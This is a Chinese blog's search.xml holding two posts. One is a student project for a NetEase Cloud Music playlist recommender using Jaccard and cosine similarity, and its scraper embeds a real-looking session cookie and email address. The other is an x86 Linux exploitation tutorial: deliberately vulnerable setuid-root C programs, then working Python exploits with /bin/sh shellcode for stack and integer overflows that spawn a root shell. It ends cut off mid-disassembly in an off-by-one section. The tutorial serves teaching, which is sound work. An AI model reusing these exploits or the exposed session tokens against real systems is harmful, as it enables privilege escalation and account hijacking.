<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[网易云音乐推荐系统]]></title>
    <url>%2F2019%2F07%2F25%2F%E7%BD%91%E6%98%93%E4%BA%91%E9%9F%B3%E4%B9%90%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%2F</url>
    <content type="text"><![CDATA[综述以网易云音乐推荐算法为例，我们设计了一款基于用户的音乐推荐算法。在获取大量用户信息的情况下，指定任意一位用户，我们可以找出与其相似度最高的用户，并且根据用户的喜好推荐出一个他可能喜欢的歌单。 本次课设大体可以分为两个模块，爬虫和推荐算法，下文将对这两个模块进行详细分析。 爬虫模块需要爬取的数据及爬取原因本次课程设计的目的是设计一个基于网易云音乐的歌单推荐系统，核心是一个基于特定用户的一个推荐算法，但是核心算法是基于用户的，以一个用户为中心，我们需要大量的样本去创造一个巨大的数据集，用数据集里的用户与这个中心用户进行对比，计算出相似度，数据集从何而来？我们无法获得网易云音乐的后台数据，所以需要使用爬虫技术去网易云音乐的网页上爬取关键信息。 小组在权衡利弊以后决定爬取用户的历史歌单作为数据集的组成部分，因为历史歌单反映了用户最近听取的歌曲以及用户最近的喜好，还反映了用户听取历史歌曲的次数，可以直接显示出用户的喜好。本次爬取是基于网易云音乐动态页面的爬取，具体爬取过程如下。 动态网页爬取技术经过对网易云音乐界面的分析，总结出爬取过程中需要了解到下面的几种技术 动态网页动态网页是一个对所有动态生成与动态更新的网页的统称。与传统的静态网页相反，它会因为变量的改变而产生不同的网页，动态网页往往把随着一些数据库操作。本次页面爬取不同于静态页面， Ajax技术中文为异步的JavaScript和xml，AJAX应用可以仅向服务器发送并取回必须的数据，并在客户端采用JavaScript处理来自服务器的回应。因为在服务器和浏览器之间交换的数据大量减少，服务器回应更快了。同时，很多的处理工作可以在发出请求的客户端机器上完成，因此Web服务器的负荷也减少了 XHRXMLHTTP是AJAX网页开发技术的重要组成部分，XMLHTTP是一组API函数集，可被JavaScript、VBScript以及其它web浏览器内嵌的脚本语言调用，通过HTTP在浏览器和web服务器之间收发XML或其它数据 爬取步骤及细节(1) 首先需要用户登录才可以获取到用户信息，所以第一步为用户登录； (2) 因为点击历史歌单的链接，本次刷新页面只是局部刷新，所以猜测到是使用了Ajax技术，所以需要进一步分析网页的Ajax请求信息； (3) 打开火狐浏览器的F12开发者工具，选中网络，筛选出所有的JS和XHR请求，在其发现了需要的Record信息； (4) 进入请求中进行详细分析，得出Ajax请求的地址信息 (5) 得到传递的参数信息，传递了两个参数，params和encSecKey (6) 本次爬取需要相应的用户信息才可以做到爬取特定用户的信息，所以这里需要在爬取时在HTTP请求头中加入用户的Cookie信息，做到模仿用户登录来爬取特定信息，这里我们采取burpsuite抓取数据包的方式获得用户的Cookie数据 (7) 响应中有我们需要的详细歌单信息 (8) 总结：需要用户的Cookie信息模仿登录，url为Ajax的请求地址，需要在请求时POST相应的参数。 Python源码12345678910111213141516171819202122#coding:utf-8from urllib import request, parseimport jsonurl = "https://music.163.com/weapi/v1/play/record?csrf_token=b55a89d5bac7994f60666202c2ecd1dd"head = &#123; 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36', 'Referer': 'https://music.163.com/', 'Cookie':'_iuqxldmzr_=32; _ntes_nnid=bb407261' ' 7d2c7728aeb0d00825c89c77,1545055580618; _ntes_nuid=bb4072617d2c7728aeb0d00825c89c77; WM_TID=ekr3YxPzrtVFVRFEBEcpe4*%2F*xPuJlUWfm; __utma=94650624.1316911545.1545055581.1545055581.1545825111.2; __utmz=94650624.1545825111.2.2.utmcsr=kaizynx.github.io|utmccn=(referral)|utmcmd=referral|utmcct=/2018/09/01/Blog_build/; P_INFO=904367196@qq.com|1547475857|0|lofter|00&amp;99|null&amp;null&amp;null#not_found&amp;null#10#0|&amp;0||904367196@qq.com; mail_psc_fingerprint=7c6a02915081b795221df5f7b2459fdc; WM_NI=pVyGKwYGPrlfLuuRUTeMa1KIwOsABEm8s1ADJIjPpxT7cWfNNwekW6emVaaFml1LGnnDud1Uor8nMf9rxIj*%2F*SJFXQiOOHofUULZWM07jeGlWvkye5iFAvEaZYXH2hLFha1A%3D; WM_NIKE=9ca17ae2e6ffcda170e2e6eea4c87cf3adf8b5e87f88ef8bb3c84a929b9b85b773abb286abce4981969bacdc2af0fea7c3b92ab48ab7a8ca7d9b99a093ef6e90abbbb3d860a793afd2ca43b591bda2c14fafe8bdd2c4508a97a6b1f37498e9adb8e5468ea9ab8cd63ea7b39a82e44eafb4ffadc666ae9cbb85b45fadaef88fd06efbaeb8aae92591968ab9d4638d918890e55f979496b8d03cf5b6aba8ef5db6b5b786b863869fbaa6e4529b8888d3eb4886b8afd2c437e2a3; __remember_me=true; JSESSIONID-WYYY=kloR*%2F*EKfYxX1S4*%2F*%2Bxw8%2BOCOS62GdKDh1AIwoeuGbEJESfjOKEEy1w8u9VcBbxBczUV9Fei6oQX3cTuRbRs%5CjENHa3U0Zv%2BuCXrZ3qh1mpPBtMyNK5mtbliz5ld65Yt%2BVtOZesfzV%2BCtJPJ%5Ci8rfdD7mcAVhBrTzdrVelvT8HXw7qJC6C%3A1560904504726; MUSIC_U=d52d8fce725f1a1bbd576340f32176498461110d60248d031f2f561a7b06c09a424bd0eccd382f940222602dc7446ab47955a739ab43dce1; __csrf=e62c53be7a6fcf0e9204219e51725530'&#125;data = &#123;'params':'gzwJSGe0IUsDHQSp+44wByyhj2vXeFSQ1HpoLMfI8NNCDRxid85h1S9ZZBycBkNB7iIFldTMtdDilKgjLzqz3CanHb+BBU5uZnaX1M9FbZXk6L+cW0jwjlu9a5TnnBSe+nwgNoJFgYHCy0nShiG+IL0D7tC06LeyuX4iHq7uzAWXZQObjyhbK6SWPHFPDKKxZ+6zF0ustifWIL6P0hz6/M/sfsQeu4JIXZalOJPZPbA=', 'encSecKey':'cd9ba1eb7da640f09deb1290735c1a56632875e04889ce74dc024cc1123bdf0d47da2b0573a73a3a0797f9824d0930365745258c5eda2cdc9694b67cd144754d5bcf9c6d164136a643fdc81976b4bbb3f9929f1413762b9bf65599a3e88c1223c6fa6ee259d2643caa67e7005a10fb096193c45e9c9ab72fa00a8934f644c1f2'&#125;data = parse.urlencode(data).encode('utf-8')request1 = request.Request(url, data, headers=head)response = request.urlopen(request1)html = response.read().decode('utf-8')results = json.loads(html)with open('info11.json','w') as f:json.dump(results,f) 代码使用了python的urllib和json模块，用urllib模块发起请求，得到响应，使用json模块将爬取到的json格式的字符存储为json文件，用于下一步的数据处理和算法分析。 爬取结果展示（1）生成大量json文件，部分截图如下： （2）Json文件中存取每个不同用户的信息 算法模块算法说明算法的思想是基于用户的协同过滤算法，用一个词来概括可以说是物以类聚。我们分析了用户的历史数据，包括喜欢的歌曲，最近收听的歌曲，已下载的歌曲，放入歌单的歌曲等，对这些数据进行度量与打分。根据所有用户对于所有喜好歌曲的重复比例，以及相同歌曲的喜好程度，可以计算出用户之间的相似度。有相同喜好的用户之间可以进行推荐。简单来说，假定用户A喜欢歌曲a，b，用户B喜欢歌曲a，b，c，那么我们可以认为用户B喜欢的，用户A也应该喜欢。所以我们把歌曲c推荐给用户A。 我们使用了两个算法来进行相似度的比较：使用jaccard系数比较两个用户歌曲的重复程度，将两个用户对重复歌曲分别的播放次数计算余弦相似度，来比较用户对歌曲的喜欢程度。 jaccard系数Jaccard系数的公式为： 用自然语言描述为用户A和用户B的交集与A，B的并集之比。主要应用于查重功能。使用jaccard系数衡量用户喜欢歌曲的相似性根据用 户所有时间听歌排行评价用户相似性时，歌单里的每一首歌都是用户喜欢的歌，系数score代表用户喜欢的程度。用A 代表用户A喜欢的歌曲集合，用B 代表用户B 喜欢的歌曲集合，则jaccadr系数为：A和B共同喜好的歌除以A和B所有听过的歌。 余弦相似度余弦相似度的公式为： 由简单的余弦定理演变而来，余弦相似度用向量空间中两个向量夹角的余弦值作为衡量两个个体间差异的大小。余弦值越接近1，就表明夹角越接近0度，也就是两个向量越相似。我们将之前jaccard系数算出的重复的歌进行比较，获取这些歌最近的播放次数，将播放次数作为向量的内容，来计算余弦相似度。余弦值越高，表明两个用户相似度越高。求出相似度最高的用户作为推荐的样本。 歌单筛选求出相似度最高的用户后如何进行推荐呢，我们爬取了该用户最近一周内所有播放的歌进行筛选，去除掉播放次数小于2的歌。我们认为播放次数小于2的歌并不代表该用户对这首歌感兴趣，也许仅仅是试听内容。将播放次数大于2的歌打包为歌单，推荐给用户，这就是实现的推荐算法。 代码分析与展示首先，我们爬取到了4个用户的数据，但是爬取到的数据非常多，数据是格式化的json数据，里面有我们不需要的冗余数据。这时我们就需要对爬取数据进行筛选，选出我们需要的，剔除我们不需要的。数据包括用户全部数据allDate和本周的最新数据数据weekDate，所以我们也需要对爬取的数据进行分类。 数据处理我们自己编写了一个handle()函数，用来实现数据的预处理。handle函数有2个参数，一个是info，另一个是mode。Info是json格式的数据。标志量mode的true或者false表示当前读取的allDate还是weekDate。预处理后的数据存放在字典型变量dic中。字典中共有4个索引，分别是singers，songs，scores和username，分别对应用户的所听的歌曲的演唱者，歌曲名，歌曲播放评率与当前用户的用户名。然后遍历info文件，将对应数据放入字典对应组中。这样就完成了数据的预处理。 1234567891011121314151617def handle(info,mode=True): username = info['username'] if mode==True: info = info['allData'] else: info = info['weekData'] dic = dict() dic["singers"] = [] dic["songs"] = [] dic["scores"] = [] dic['username'] = username for item in info: dic['songs'].append(item['song']['song']['name']) dic['singers'].append(item['song']['song']['artist']['name']) dic['scores'].append(item['playCount']) \# print(dic) return dic 求交集函数-repeatlist()因为我们使用jaccard算法和余弦相似度算法进行推荐，这两种方法都需要计算两个列表的交集。所以我们创建一个函数专门来计算交集： 123456def repeatlist(list1, list2): relist = list() for each in list1: if each in list2: relist.append(each) return relist 相似度算法1-jaccard()这部分是jaccard算法计算相似度，因为相似歌手和相似歌曲的jaccard系数都对于两个用户的相似程度，所以我们分别计算其相似度并乘以该项的权值（0.5）作为评估两个用户相似度的标准。该函数有2个参数user1和user2，是2个用户的待评估项组成的列表。 1234567891011121314151617def jaccard(user1,user2): singers1 = user1['singers'] singers2 = user2['singers'] songs1 = user1['songs'] songs2 = user2['songs'] \# 计算集合长度 count1 = len(singers1) count2 = len(singers2) \# 计算交集 repeatsongs = len(repeatlist(songs1,songs2)) repeatsingers = len(repeatlist(singers1,singers2)) if not repeatsongs and not repeatsingers: return 0 \# 分别计算jaccard值 jas1 = repeatsongs / (count2 + count1 - repeatsongs) jas2 = repeatsingers / (count1 + count2 - repeatsingers) return (jas1 + jas2) / 2 * 100 相似度算法2-cossimi()在该部分中，我们计算的是重复歌曲列表中余弦相似度。用以评估jaccard系数的准确程度，该函数有2个参数user1和user2，是2个用户的数据分别组成的字典为{‘singers’:,”songs”:,}。最后返回2个用户的余弦相似度。其中有一部分计算相似歌曲矩阵，我们使用numpy模块中的array()函数。将列表转化为矩阵。然后使用inner()方法计算所需要的数据。 1234567891011121314151617181920def cossimi(user1, user2): songs1 = user1['songs'] songs2 = user2['songs'] repeatsongs = repeatlist(songs1, songs2) if not repeatsongs: return 0 def score(songs, user): scores = list() for each in repeatsongs: index = songs.index(each) scores.append(user['scores'][index]) return scores score1 = score(songs1, user1) score2 = score(songs2, user2) matrix1 = np.array(score1) matrix2 = np.array(score2) num = np.inner(matrix1, matrix2) deno = np.sqrt(matrix1.dot(matrix1)) * np.sqrt(matrix2.dot(matrix2)) res = (num / deno) * 100 return res 生成推荐结果在得到每个用户的jaccard系数与余弦相似度之后，我们取该两项的乘积作为评估两个用户匹配程度的最终得分，然后对于我们的目标用户，在指定的用户群中（理论上越多越好，本实验中为4个用户），依次计算用户群的每个用户与目标用户的匹配得分，取用户群中最高得分的用户的一周内的播放次数大于2的歌曲推荐给目标用户，之所以不推荐播放次数小于2的歌曲，是因为这部分这些歌曲可能并非是用户喜欢的歌曲而仅仅是用户试听的歌曲而已。核心代码如下 123456789101112for item in users: jac = jaccard(item,u) cos = cossimi(item,u) print("&#123;&#125;与&#123;&#125;的jaccard相似度为：&#123;:.2f&#125;%".format(user['username'],item['username'],jac)) print("&#123;&#125;与&#123;&#125;的余弦相似度为：&#123;:.2f&#125;%".format(user['username'],item['username'],cos)) pts = jac * cos if pts &gt; max_num: max_num = pts index = users.index(item) recommenduser = item['username']recommend = users_weekdata[index] 完整代码展示123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138import jsonimport numpy as npdef handle(info,mode=True): username = info['username'] if mode==True: info = info['allData'] else: info = info['weekData'] dic = dict() dic["singers"] = [] dic["songs"] = [] dic["scores"] = [] dic['username'] = username for item in info: dic['songs'].append(item['song']['song']['name']) dic['singers'].append(item['song']['song']['artist']['name']) dic['scores'].append(item['playCount']) # print(dic) return dic# 计算两个列表的重复元素def repeatlist(list1, list2): relist = list() for each in list1: if each in list2: relist.append(each) return relist# 计算两个用户的jaccard相似度，由于歌手和歌曲均有影响，所以分别计算歌曲和歌手的余弦相似度取平均值# user参数为字典，分别为&#123;'singers':,"songs":,&#125;def jaccard(user1,user2): singers1 = user1['singers'] singers2 = user2['singers'] songs1 = user1['songs'] songs2 = user2['songs'] # 计算集合长度 count1 = len(singers1) count2 = len(singers2) # 计算交集 repeatsongs = len(repeatlist(songs1,songs2)) repeatsingers = len(repeatlist(singers1,singers2)) if not repeatsongs and not repeatsingers: return 0 # 分别计算jaccard值 jas1 = repeatsongs / (count2 + count1 - repeatsongs) jas2 = repeatsingers / (count1 + count2 - repeatsingers) return (jas1 + jas2) / 2 * 100# 余弦相似度# 计算重复歌曲列表的余弦相似度def cossimi(user1, user2): songs1 = user1['songs'] songs2 = user2['songs'] repeatsongs = repeatlist(songs1, songs2) if not repeatsongs: return 0 # 计算相似歌曲矩阵 def score(songs, user): scores = list() for each in repeatsongs: index = songs.index(each) scores.append(user['scores'][index]) return scores score1 = score(songs1, user1) score2 = score(songs2, user2) matrix1 = np.array(score1) matrix2 = np.array(score2) num = np.inner(matrix1, matrix2) deno = np.sqrt(matrix1.dot(matrix1)) * np.sqrt(matrix2.dot(matrix2)) res = (num / deno) * 100 return res# user2 = &#123;"singers":["a","b","c","d","e","a","b","c","d","e"],"songs":['海阔a天空', '御花a园', '伤心19a99', '丑八a怪', '给我a一首歌的间', '水a手', 'Beat aIt', '大a约在季', '明天会更a好', '新贵妃醉a酒']&#125;def main(user): # 读取待比较的用户信息 # users = &#123;'name':,"data":&#125; users = [] users_weekdata = [] for i in range(1,4): with open("info"+str(i)+".json",'r') as f: jsondata = f.read() data = json.loads(jsondata) users.append(handle(data)) users_weekdata.append(handle(data,False)) max_num = 0 index = 0 print('-----------data analysising---------------') print() for item in users: jac = jaccard(item,u) cos = cossimi(item,u) print("&#123;&#125;与&#123;&#125;的jaccard相似度为：&#123;:.2f&#125;%".format(user['username'],item['username'],jac)) print("&#123;&#125;与&#123;&#125;的余弦相似度为：&#123;:.2f&#125;%".format(user['username'],item['username'],cos)) pts = jac * cos if pts &gt; max_num: max_num = pts # recommendlist = item["songs"] # recommendsinger = item['singers'] index = users.index(item) recommenduser = item['username'] recommend = users_weekdata[index] print() print('-------------completed-------------------') print() print("&#123;&#125;与&#123;&#125;相似度最高，最终推荐的歌单为：".format(user['username'],recommenduser)) print() for i in range(len(recommend['singers'])): if(recommend['scores'][i] &lt;= 2): continue print("&#123;&#125;---------------&#123;&#125;".format(recommend['songs'][i],recommend['singers'][i]))if __name__ == '__main__': with open("info4.json",'r') as f: jsondata = f.read() data1 = json.loads(jsondata) u = handle(data1) # print(data1['weekData']) main(u) 运行结果 总结与收获（结合信息安全）这个推荐系统是基于内容的推荐，是以歌曲名字及歌手信息的推荐。我们用了jaccard算法和余弦相似算法计算相似度。其中这两个算法都需要先计算两个列表中相似的部分。对于相似算法，我们可以用于话题的检测与追踪。首先将话题模型化，报道模型化。然后使用相似度算法比较其相似度，其次我们比较一个阈值，若相似度大于这个阈值，则判断话题与这个报道相关就可以进行舆情监控；反之，则判断话题与报道无关，则建立一个新的话题。 ​ 算法当中还有不足的地方，在比较相同歌曲重复度的时候，仅仅是比较重复的歌名。但是歌曲中间还有不同的版本。例如（Remix）版本和（Live）版本，除了在音质上有区别外，其他并没有本质的区别。但是算法还是会把它们区分出来。除次以外，还应该考虑一下同一个歌手的不同歌曲之间的相似度，根据共同喜好的歌手进行推荐。]]></content>
      <categories>
        <category>信息系统安全</category>
        <category>推荐系统</category>
      </categories>
      <tags>
        <tag>信息系统</tag>
        <tag>Jcard算法</tag>
        <tag>余弦相似度</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux (x86) Exploit 开发系列教程]]></title>
    <url>%2F2019%2F07%2F20%2FLinux%20(x86)%20Exploit%20%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[典型的基于堆栈的缓冲区溢出虚拟机：Ubuntu 12.04（x86） 目标缓冲区位于堆栈中，将源缓冲区复制到目标缓冲区可能导致溢出，首先源字符串长度大于目标缓冲区长度，并且不进行大小检查。导致溢出执行任意代码，允许供给制执行他的代码以获得对受害者及其的控制。 漏洞代码： 123456789//test.c #include &lt;stdio.h&gt; #include &lt;string.h&gt; int main(int argc, char argv[]) &#123; /* [1] */ char buf[256]; /* [2] */ strcpy(buf,argv[1]); /* [3] */ printf("Input:%s\n",buf); return 0; &#125; 编译代码： 12345#echo 0 &gt; /proc/sys/kernel/randomize_va_space $gcc -g -fno-stack-protector -z execstack -o test test.c $sudo chown root test $sudo chgrp root test $sudo chmod +s test 上述漏洞代码中的[2]行显示里缓冲区溢出。这个bug可能导致任意代码执行，因为缓冲区内容是用户可以自行输入。 gdb反汇编 1234567891011121314151617181920212223242526 szt@ubuntu:~/linux exploit/test1$ gdb -q test Reading symbols from /home/szt/linux exploit/test1/test...done. gdb-peda$ set disassembly intel gdb-peda$ disass main Dump of assembler code **for** function main: 0x08048414 &lt;+0&gt;: push ebp 0x08048415 &lt;+1&gt;: mov ebp,esp 0x08048417 &lt;+3&gt;: and esp,0xfffffff0 0x0804841a &lt;+6&gt;: sub esp,0x110 0x08048420 &lt;+12&gt;: mov eax,**DWORD** PTR [ebp+0xc] 0x08048423 &lt;+15&gt;: add eax,0x4 0x08048426 &lt;+18&gt;: mov eax,**DWORD** PTR [eax] 0x08048428 &lt;+20&gt;: mov **DWORD** PTR [esp+0x4],eax 0x0804842c &lt;+24&gt;: lea eax,[esp+0x10] 0x08048430 &lt;+28&gt;: mov **DWORD** PTR [esp],eax 0x08048433 &lt;+31&gt;: call 0x8048330 &lt;strcpy@plt&gt; 0x08048438 &lt;+36&gt;: mov eax,0x8048530 0x0804843d &lt;+41&gt;: lea edx,[esp+0x10] 0x08048441 &lt;+45&gt;: mov **DWORD** PTR [esp+0x4],edx 0x08048445 &lt;+49&gt;: mov **DWORD** PTR [esp],eax 0x08048448 &lt;+52&gt;: call 0x8048320 &lt;printf@plt&gt; 0x0804844d &lt;+57&gt;: mov eax,0x0 0x08048452 &lt;+62&gt;: leave 0x08048453 &lt;+63&gt;: ret End of assembler dump. gdb-peda$ 由此可以推测出堆栈布局： 首先我们可以发现buf[]有256个大小，并且buf[]之后的堆栈是返回地址。理论上如果填充大于256大小的数据到目标缓冲区中，那么会溢出，使得返回地址被多出来的数据所覆盖。所以我们发送一系列的A来测试。 测试1：是否可以覆盖返回地址 发现输出的eip已经是0x41414141，0x41是A的16进制。这样可以确定返回地址已经被我们发送的300个A覆盖了。 那么我们可以计算，返回地址距buf[] 偏移了多少。首先是buf[]自己的256大小，其次是8个大小对齐空间，然后是4个大小的ebp。 0x100 + 0x8 + 0x4=0x10c 所以偏移了0x10c个大小。 那么我们编写攻击代码exp.py来攻击 攻击代码： 123456789101112131415161718 #exp.py #!/usr/bin/env python import struct from subprocess import call #Stack address where shellcode is copied. ret_addr = 0xbffff220 #Spawn a shell #execve(/bin/sh) scode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" #endianess convertion def conv(num): return struct.pack("&lt;I",numnk + RA + NOP's + Shellcode buf = "A" * 268 buf += conv(ret_addr) buf += "\x90" * 100 buf += scode print "Calling vulnerable program" call(["./test", buf]) 执行上面的exp.py程序，给我们root shell 整数溢出虚拟机安装：Ubuntu 12.04（x86） 存储大于最大支持值的称为整数溢出。整数溢出本身不会导致任意代码执行，但是整数溢出可能会导致堆栈溢出或者堆溢出，这可能导致任意代码执行。 数据类型大小及范围： 当我们存储一个大于最大值的值的时候，我们的值将会被包装。例如，当我们尝试将21645545422313存储到带符号的int数据类型时，它将被包装并存储为-21645545422313。 类似的，存储小于最小支持值的值称为整数下溢。例如，当我们尝试将-2147483649存储到带符号的int数据类型时，它将被包装并存储为21471483647.这称为整数下溢。在这里我只会谈论整数溢出，但是这个过程对于下溢也是一样的。 漏洞代码： 12345678910111213141516171819202122232425262728293031323334//test.c #include &lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;stdlib.h&gt; void store_passwd_indb(char* passwd) &#123; &#125; void validate_uname(char* uname) &#123; &#125; void validate_passwd(char* passwd) &#123; char passwd_buf[11]; unsigned char passwd_len = strlen(passwd); /* [1] */ if(passwd_len &gt;= 4 &amp;&amp; passwd_len &lt;= 8) &#123; /* [2] */ printf("Valid Password\n"); /* [3] */ fflush(stdout); strcpy(passwd_buf,passwd); /* [4] */ &#125; else &#123; printf("Invalid Password\n"); /* [5] */ fflush(stdout);&#125; store_passwd_indb(passwd_buf); /* [6] */ &#125; int main(int argc, char* argv[]) &#123; if(argc!=3) &#123; printf("Usage Error: \n"); fflush(stdout); exit(-1); &#125; validate_uname(argv[1]); validate_passwd(argv[2]); return 0; &#125; 编译命令： 12345#echo 0 &gt; /proc/sys/kernel/randomize_va_space $ gcc -g -fno-stack-protector -z execstack -o test test.c $ sudo chown root test $ sudo chgrp root test $ sudo chmod + s test 上述漏洞代码的[1]行显示了一个整数溢出错误。strlen（）的返回类型是size_t（unsigned int），它存储在unsigned char数据类型中。因此，任何大于unsigned char的最大支持值的值都会导致整数溢出。因此当密码长度为261时，261将被包裹并存储为passwd_len变量中的5！由于这个整数溢出，可以绕过行[2]执行的边界检查，从而导致基于堆栈的缓冲区溢出！而且在这篇文章中看到，基于堆栈的缓冲区溢出导致任意的代码执行。 反汇编： 123456789101112131415161718192021222324252627282930313233 szt@ubuntu:~/linux exploit/test2$ gdb -q test Reading symbols from /home/szt/linux exploit/test2/test...done. gdb-peda$ set disassembly intel gdb-peda$ disass main Dump of assembler code **for** function main: 0x0804852a &lt;+0&gt;: push ebp 0x0804852b &lt;+1&gt;: mov ebp,esp 0x0804852d &lt;+3&gt;: and esp,0xfffffff0 0x08048530 &lt;+6&gt;: sub esp,0x10 0x08048533 &lt;+9&gt;: cmp **DWORD** PTR [ebp+0x8],0x3 0x08048537 &lt;+13&gt;: je 0x804855e &lt;main+52&gt; 0x08048539 &lt;+15&gt;: mov **DWORD** PTR [esp],0x8048680 0x08048540 &lt;+22&gt;: call 0x80483a0 &lt;puts@plt&gt; 0x08048545 &lt;+27&gt;: mov eax,ds:0x804a020 0x0804854a &lt;+32&gt;: mov **DWORD** PTR [esp],eax 0x0804854d &lt;+35&gt;: call 0x8048380 &lt;fflush@plt&gt; 0x08048552 &lt;+40&gt;: mov **DWORD** PTR [esp],0xffffffff 0x08048559 &lt;+47&gt;: call 0x80483c0 &lt;exit@plt&gt; 0x0804855e &lt;+52&gt;: mov eax,**DWORD** PTR [ebp+0xc] 0x08048561 &lt;+55&gt;: add eax,0x4 0x08048564 &lt;+58&gt;: mov eax,**DWORD** PTR [eax] 0x08048566 &lt;+60&gt;: mov **DWORD** PTR [esp],eax 0x08048569 &lt;+63&gt;: call 0x8048499 &lt;validate_uname&gt; 0x0804856e &lt;+68&gt;: mov eax,**DWORD** PTR [ebp+0xc] 0x08048571 &lt;+71&gt;: add eax,0x8 0x08048574 &lt;+74&gt;: mov eax,**DWORD** PTR [eax] 0x08048576 &lt;+76&gt;: mov **DWORD** PTR [esp],eax 0x08048579 &lt;+79&gt;: call 0x804849e &lt;validate_passwd&gt; 0x0804857e &lt;+84&gt;: mov eax,0x0 0x08048583 &lt;+89&gt;: leave 0x08048584 &lt;+90&gt;: ret End of assembler dump. gdb-peda$ 堆栈布局： 由于我们已经知道长度为261的密码，所以绕过边界检查，并允许我们覆盖堆栈中的返回地址。让我们通过发送一系列的A来测试它。 测试步骤1：是否可以覆盖返回地址？ 发现可以溢出，并且eip已经被AAAA覆盖了。 测试步骤2：目的缓冲区的偏移量是多少？ 这里让我们从缓冲区passwd_buf中找出什么偏移返回地址。反汇编并绘制了validate_passwd（）的堆栈布局，现在可以尝试找到偏移位置信息。 首先是0xb个大小的buf[],然后是0x1大小的passwd_len，然后是0x4个大小的对齐空间，最后是0x4个大小的edi和0x4个大小的调用者的ebp指针。 0x18 = 0xb + 0x1 + 0x4 + 0x4 + 0x4 因此，用户输入的“A” * 24 + “B” * 4 + “C” * 233，以A覆盖passwd_buf，passwd_len，对齐空间，edi和调用者的ebp，以BBBB覆盖返回地址，以C覆盖剩余空间 发现eip已经被BBBB覆盖了。然后我们就能用上述漏洞编写一个攻击代码exp.py 攻击代码： 1234567891011121314151617181920 #exp.py #!/usr/bin/env python import struct from subprocess import call arg1 = "sploitfun" #Stack address where shellcode is copied. ret_addr = 0xbffff274 #Spawn a shell #execve(/bin/sh) scode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" #endianess convertion def conv(num): return struct.pack("&lt;I",num) #unk + RA + NOP's + Shellcode arg2 = "A" * 24 arg2 += conv(ret_addr); arg2 += "\x90" * 100 arg2 += scode arg2 += "C" * 108 print "Calling vulnerable program" call(["./test", arg1, arg2]) 执行上面的exp.py程序，给我们root shell Off-By-One 漏洞 (基于栈)虚拟机安装：Ubuntu 12.04（x86） 将字符串复制到目标缓冲区可能导致off by one。当源字符串长度等于目标缓冲区长度，单个null字节将被复制到目标缓冲区上方。这里由于目标缓冲区位于堆栈中，所以单个null字节可以覆盖存储在堆栈中的调用者的ebp的最低有效位，这可能导致任意代码的执行。 漏洞代码： 1234567891011121314151617181920212223//test.c #include &lt;stdio.h&gt; #include &lt;string.h&gt; void foo(char* arg); void bar(char* arg); void foo(char* arg) &#123; bar(arg); /* [1] */ &#125; void bar(char* arg) &#123; char buf[256]; strcpy(buf, arg); /* [2] */ &#125; int main(int argc, char *argv[]) &#123; if(strlen(argv[1])&gt;256) &#123; /* [3] */ printf("Attempted Buffer Overflow\n"); fflush(stdout); return -1; &#125; foo(argv[1]); /* [4] */ return 0; &#125; 编译命令： 12345#echo 0 &gt; /proc/sys/kernel/randomize_va_space $gcc -fno-stack-protector -z execstack -mpreferred-stack-boundary=2 -o test test.c $sudo chown root test $sudo chgrp root test $sudo chmod +s test 上述漏洞代码的第[2]行是可能发生off by one溢出的地方。目标缓冲区长度为256，因此长度为256字节的源字符串可能导致任意代码执行。 使用称为EBP覆盖的技术实现任意代码执行。如果调用者的EBP位于目标缓冲区之上，则在strcpy之后，单个NULL字节将覆盖调用者EBP的LSB。 反汇编： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465 gdb-peda$ set disassembly intel gdb-peda$ disass main Dump of assembler code for function main: 0x08048497 &lt;+0&gt;: push ebp 0x08048498 &lt;+1&gt;: mov ebp,esp 0x0804849a &lt;+3&gt;: push edi 0x0804849b &lt;+4&gt;: sub esp,0x8 0x0804849e &lt;+7&gt;: mov eax,DWORD PTR [ebp+0xc] 0x080484a1 &lt;+10&gt;: add eax,0x4 0x080484a4 &lt;+13&gt;: mov eax,DWORD PTR [eax] 0x080484a6 &lt;+15&gt;: mov DWORD PTR [ebp-0x8],0xffffffff 0x080484ad &lt;+22&gt;: mov edx,eax 0x080484af &lt;+24&gt;: mov eax,0x0 0x080484b4 &lt;+29&gt;: mov ecx,DWORD PTR [ebp-0x8] 0x080484b7 &lt;+32&gt;: mov edi,edx 0x080484b9 &lt;+34&gt;: repnz scas al,BYTE PTR es:[edi] 0x080484bb &lt;+36&gt;: mov eax,ecx 0x080484bd &lt;+38&gt;: not eax 0x080484bf &lt;+40&gt;: sub eax,0x1 0x080484c2 &lt;+43&gt;: cmp eax,0x100 0x080484c7 &lt;+48&gt;: jbe 0x80484e9 &lt;main+82&gt; 0x080484c9 &lt;+50&gt;: mov DWORD PTR [esp],0x80485e0 0x080484d0 &lt;+57&gt;: call 0x8048380 &lt;puts@plt&gt; 0x080484d5 &lt;+62&gt;: mov eax,ds:0x804a020 0x080484da &lt;+67&gt;: mov DWORD PTR [esp],eax 0x080484dd &lt;+70&gt;: call 0x8048360 &lt;fflush@plt&gt; 0x080484e2 &lt;+75&gt;: mov eax,0xffffffff 0x080484e7 &lt;+80&gt;: jmp 0x80484fe &lt;main+103&gt; 0x080484e9 &lt;+82&gt;: mov eax,DWORD PTR [ebp+0xc] 0x080484ec &lt;+85&gt;: add eax,0x4 0x080484ef &lt;+88&gt;: mov eax,DWORD PTR [eax] 0x080484f1 &lt;+90&gt;: mov DWORD PTR [esp],eax 0x080484f4 &lt;+93&gt;: call 0x8048464 &lt;foo&gt; 0x080484f9 &lt;+98&gt;: mov eax,0x0 0x080484fe &lt;+103&gt;: add esp,0x8 0x08048501 &lt;+106&gt;: pop edi 0x08048502 &lt;+107&gt;: pop 